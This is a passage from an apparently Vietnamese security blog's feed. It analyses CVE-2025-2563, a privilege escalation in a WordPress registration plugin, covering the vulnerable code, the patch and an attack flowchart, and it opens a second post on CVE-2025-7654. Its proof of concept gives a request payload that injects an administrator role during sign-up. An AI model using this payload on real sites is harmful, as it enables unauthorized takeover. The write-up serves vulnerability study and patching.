class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Mặc định, endpoint &lt;strong&gt;&lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt; chỉ hỗ trợ đăng ký tài khoản và &lt;strong&gt;chưa thể đăng ký membership&lt;/strong&gt; nếu module &lt;strong&gt;Membership&lt;/strong&gt; chưa được kích hoạt.&#xA;Để sử dụng đầy đủ chức năng, cần truy cập &lt;strong&gt;&lt;code&gt;/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/code&gt;&lt;/strong&gt; và bật module &lt;strong&gt;Membership&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Sau khi kiểm tra &lt;strong&gt;nonce&lt;/strong&gt;, hàm sẽ lấy dữ liệu từ &lt;strong&gt;&lt;code&gt;$_POST[&#39;members_data&#39;]&lt;/code&gt;&lt;/strong&gt;, thực hiện &lt;strong&gt;&lt;code&gt;json_decode&lt;/code&gt;&lt;/strong&gt;, chuyển thành &lt;strong&gt;mảng&lt;/strong&gt; và gán vào biến &lt;strong&gt;&lt;code&gt;$data&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = apply_filters(&#xA;    &amp;#39;user_registration_membership_before_register_member&amp;#39;,&#xA;    isset( $_POST[&amp;#39;members_data&amp;#39;] )&#xA;        ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true )&#xA;        : array()&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;strong&gt;&lt;code&gt;$data[&#39;username&#39;]&lt;/code&gt;&lt;/strong&gt; tồn tại, hàm sẽ tiếp tục gọi &lt;strong&gt;&lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;&lt;/strong&gt; để xử lý đăng ký thành viên.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_membership_order_and_subscription( $data ) {&#xA;    try {&#xA;        $this-&amp;gt;members_repository-&amp;gt;wpdb()-&amp;gt;query( &amp;#39;START TRANSACTION&amp;#39; ); // Start the transaction.&#xA;        $members_data = $this-&amp;gt;members_service-&amp;gt;prepare_members_data( $data );&#xA;        $member       = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&#xA;&#xA;        //update user source and add membership_role&#xA;        $this-&amp;gt;members_service-&amp;gt;update_user_meta( $members_data, $member-&amp;gt;ID );&#xA;        ...&#xA;    } catch ( Exception $e ) {&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;, dữ liệu người dùng được xử lý thông qua &lt;code&gt;prepare_members_data( $data )&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function prepare_members_data( $data ) {&#xA;    if ( ! isset( $data[&amp;#39;role&amp;#39;] ) ) {&#xA;        $membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;        $membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;        $data[&amp;#39;role&amp;#39;]       = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;    }&#xA;    $role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;&#xA;    $coupon_details = array();&#xA;    if ( isset( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ur_check_module_activation( &amp;#39;coupon&amp;#39; ) ) {&#xA;        $coupon_details = ur_get_coupon_details( sanitize_text_field( $data[&amp;#39;coupon&amp;#39;] ) );&#xA;    }&#xA;&#xA;    $user_data = array(&#xA;        &amp;#39;user_login&amp;#39;    =&amp;gt; !empty( $data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_email&amp;#39;    =&amp;gt; !empty($data[&amp;#39;email&amp;#39;]) ?  sanitize_email( $data[&amp;#39;email&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_pass&amp;#39;     =&amp;gt; !empty($data[&amp;#39;password&amp;#39;]) ? $data[&amp;#39;password&amp;#39;] : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_nicename&amp;#39; =&amp;gt; (!empty($data[&amp;#39;firstname&amp;#39;]) &amp;amp;&amp;amp; !empty($data[&amp;#39;lastname&amp;#39;])) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) . &amp;#39; &amp;#39; . sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;display_name&amp;#39;  =&amp;gt; !empty($data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;first_name&amp;#39;    =&amp;gt; !empty($data[&amp;#39;firstname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;last_name&amp;#39;     =&amp;gt; !empty($data[&amp;#39;lastname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_status&amp;#39;   =&amp;gt; isset( $data[&amp;#39;member_status&amp;#39;] ) ? absint( $data[&amp;#39;member_status&amp;#39;] ) : 1,&#xA;    );&#xA;&#xA;    $membership_data = array(&#xA;        &amp;#39;membership&amp;#39;     =&amp;gt; absint( $data[&amp;#39;membership&amp;#39;] ),&#xA;        &amp;#39;start_date&amp;#39;     =&amp;gt; date( &amp;#39;Y-m-d&amp;#39;, strtotime( $data[&amp;#39;start_date&amp;#39;] ) ),&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; sanitize_text_field( $data[&amp;#39;payment_method&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;    );&#xA;&#xA;    return array(&#xA;        &amp;#39;role&amp;#39;            =&amp;gt; sanitize_text_field( $role ),&#xA;        &amp;#39;membership_data&amp;#39; =&amp;gt; $membership_data,&#xA;        &amp;#39;coupon_data&amp;#39;     =&amp;gt; $coupon_details,&#xA;        &amp;#39;user_data&amp;#39;       =&amp;gt; $user_data&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; không tồn tại&lt;/strong&gt;, hệ thống sẽ lấy role từ &lt;strong&gt;metadata của gói membership&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data[&amp;#39;role&amp;#39;] = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ngược lại, nếu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; được truyền từ request&lt;/strong&gt;, giá trị này sẽ được sử dụng trực tiếp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau đó role được đưa vào dữ liệu trả về:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return array(&#xA;    &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field( $role ),&#xA;    ...&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này đồng nghĩa với việc &lt;strong&gt;người dùng có thể tự truyền tham số &lt;code&gt;role&lt;/code&gt; trong request&lt;/strong&gt; và &lt;strong&gt;ghi đè role mặc định&lt;/strong&gt;, dẫn đến khả năng &lt;strong&gt;tự gán quyền cao hơn (ví dụ: administrator)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau đó hệ thống lấy thông tin user bằng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp theo, hàm gọi &lt;code&gt;update_user_meta()&lt;/code&gt; để cập nhật &lt;strong&gt;user meta&lt;/strong&gt; và &lt;strong&gt;membership_role&lt;/strong&gt; cho người dùng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_user_meta( $data, $new_user_id ) {&#xA;    $user = new \WP_User( $new_user_id );&#xA;    update_user_meta( $new_user_id, &amp;#39;ur_registration_source&amp;#39;, &amp;#39;membership&amp;#39; );&#xA;    $user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&#xA;    if ( ! empty( $data[&amp;#39;coupon_data&amp;#39;] ) ) {&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount_type&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount_type&amp;#39;] );&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount&amp;#39;] );&#xA;    }&#xA;&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;update_user_meta&lt;/code&gt; tạo đổi tượng &lt;code&gt;WP_User&lt;/code&gt; tương ứng với &lt;code&gt;id=$new_user_id&lt;/code&gt;, Thiết lập role cho user trực tiếp từ dữ liệu đầu vào:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Không có bất kỳ bước kiểm tra, giới hạn hoặc whitelist role hợp lệ nào trước khi gán role =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; xảy ra.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Khi thực hiện submit form đăng ký member từ endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request đầu tiên sẽ thực hiện đăng ký user với action &lt;code&gt;user_registration_user_form_submit&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau đó request với action &lt;code&gt;user_registration_membership_register_member&lt;/code&gt; được gọi để đăng ký membership&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;p&gt;Bản vá đã &lt;strong&gt;loại bỏ hoàn toàn việc lấy role từ dữ liệu người dùng gửi lên&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong hàm &lt;code&gt;prepare_members_data()&lt;/code&gt; mới, role được xác định &lt;strong&gt;chỉ từ metadata của membership trong database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;$membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;$role               = isset( $membership_meta[&amp;#39;role&amp;#39;] ) ? $membership_meta[&amp;#39;role&amp;#39;] : &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Không còn sử dụng &lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;, do đó &lt;strong&gt;người dùng không thể tự truyền role để ghi đè&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;get_single_membership_by_ID()&lt;/code&gt; truy vấn trực tiếp database để lấy thông tin membership và &lt;code&gt;meta_value&lt;/code&gt; tương ứng với &lt;code&gt;meta_key = &#39;ur_membership&#39;&lt;/code&gt;, đảm bảo role được lấy từ &lt;strong&gt;nguồn dữ liệu tin cậy (server-side)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Kết quả: &lt;strong&gt;lỗ hổng leo thang đặc quyền đã được khắc phục&lt;/strong&gt;, vì role chỉ có thể được cấu hình bởi quản trị viên khi tạo membership, không còn bị điều khiển bởi request từ client.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /membership-registration/ to obtain nonce&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Nonce (_nonce) returned in ur_membership_frontend_localized_data&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Submit registration form&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Request sent to /wp-admin/admin-ajax.php action=user_registration_user_form_submit&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;User account created&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Second request sent to /wp-admin/admin-ajax.php action=user_registration_membership_register_member&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Attacker intercepts request and injects role=administrator into members_data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;register_member() verifies nonce only&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;prepare_members_data() trusts client-supplied role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update_user_meta() calls WP_User::set_role(role)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New account is assigned Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập endpoint đăng ký membership (&lt;code&gt;/membership-registration/&lt;/code&gt;) và tiến hành đăng ký, bật &lt;strong&gt;Burp Intercept&lt;/strong&gt; để chặn request.&lt;/li&gt;&#xA;&lt;li&gt;Forward các request cho đến khi gặp request có action &lt;strong&gt;&lt;code&gt;user_registration_membership_register_member&lt;/code&gt;&lt;/strong&gt;, sau đó chỉnh sửa tham số &lt;strong&gt;&lt;code&gt;members_data&lt;/code&gt;&lt;/strong&gt; bằng cách thêm &lt;strong&gt;&lt;code&gt;&amp;quot;role&amp;quot;:&amp;quot;administrator&amp;quot;&lt;/code&gt;&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;membership&amp;#34;:&amp;#34;406&amp;#34;,&amp;#34;total&amp;#34;:&amp;#34;0&amp;#34;,&amp;#34;payment_method&amp;#34;:&amp;#34;free&amp;#34;,&amp;#34;start_date&amp;#34;:&amp;#34;2026-1-7&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;hacker&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;administrator&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Forward request đã chỉnh sửa.&lt;/li&gt;&#xA;&lt;li&gt;Đăng nhập bằng tài khoản vừa tạo và kiểm tra quyền truy cập.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-2563 xuất phát từ việc plugin cho phép endpoint AJAX công khai xử lý đăng ký membership nhưng &lt;strong&gt;tin tưởng trực tiếp dữ liệu do client gửi lên&lt;/strong&gt;, đặc biệt là tham số &lt;code&gt;role&lt;/code&gt;. Do không có cơ chế kiểm soát hoặc whitelist role hợp lệ, attacker chưa xác thực có thể chèn giá trị &lt;code&gt;administrator&lt;/code&gt; vào request và được hệ thống gán quyền quản trị thông qua &lt;code&gt;WP_User::set_role()&lt;/code&gt;.&#xA;Bản vá ở phiên bản 4.1.2 đã khắc phục triệt để bằng cách &lt;strong&gt;loại bỏ hoàn toàn việc lấy role từ request&lt;/strong&gt;, chỉ sử dụng role được cấu hình trong metadata của membership trên server, từ đó ngăn chặn khả năng leo thang đặc quyền.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ tin tưởng dữ liệu đầu vào từ client cho các thuộc tính nhạy cảm như &lt;strong&gt;role / privilege&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint công khai (&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;) cần được đánh giá kỹ về &lt;strong&gt;quyền truy cập và phạm vi tác động&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nonce chỉ giúp chống CSRF, &lt;strong&gt;không thay thế cho kiểm soát phân quyền và validate dữ liệu&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Luôn áp dụng &lt;strong&gt;server-side validation và whitelist&lt;/strong&gt; cho các giá trị ảnh hưởng đến quyền hạn hệ thống.&lt;/li&gt;&#xA;&lt;li&gt;Việc so sánh diff giữa các phiên bản là phương pháp hiệu quả để xác định &lt;strong&gt;nguyên nhân gốc rễ và cách bản vá xử lý lỗ hổng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-1-2-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt; 4.1.2 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7654 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</link>
      <pubDate>Tue, 06 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nhiều plugin của &lt;strong&gt;FunnelKit&lt;/strong&gt; trong các phiên bản khác nhau tồn tại lỗ hổng &lt;strong&gt;tiết lộ thông tin nhạy cảm&lt;/strong&gt;, có thể dẫn đến &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt;, thông qua thư viện &lt;strong&gt;WooFunnels&lt;/strong&gt;.&#xA;Lỗ hổng này cho phép &lt;strong&gt;người dùng đã đăng nhập với quyền Contributor (Cộng tác viên) trở lên&lt;/strong&gt; có thể truy cập và khai thác một chức năng trong thư viện WooFunnels để &lt;strong&gt;lấy các thông tin nhạy cảm&lt;/strong&gt;, bao gồm &lt;strong&gt;cookie xác thực&lt;/strong&gt; của người dùng khác.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched 